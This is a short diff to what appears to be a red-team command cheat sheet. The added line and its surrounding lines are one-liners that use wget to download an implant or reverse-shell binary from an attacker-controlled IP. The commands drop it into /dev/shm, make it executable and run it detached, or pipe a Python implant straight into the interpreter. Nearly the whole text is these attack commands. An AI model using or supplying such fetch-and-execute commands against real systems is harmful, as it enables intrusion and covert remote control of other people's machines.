@@ -17,6 +17,8 @@ $ wget -qO- http[s]://<IP>/implant.py | python
 Download reverse shell binary and execute it.
 
 ```
+$ wget -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
+
 $ wget -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
 ```
 
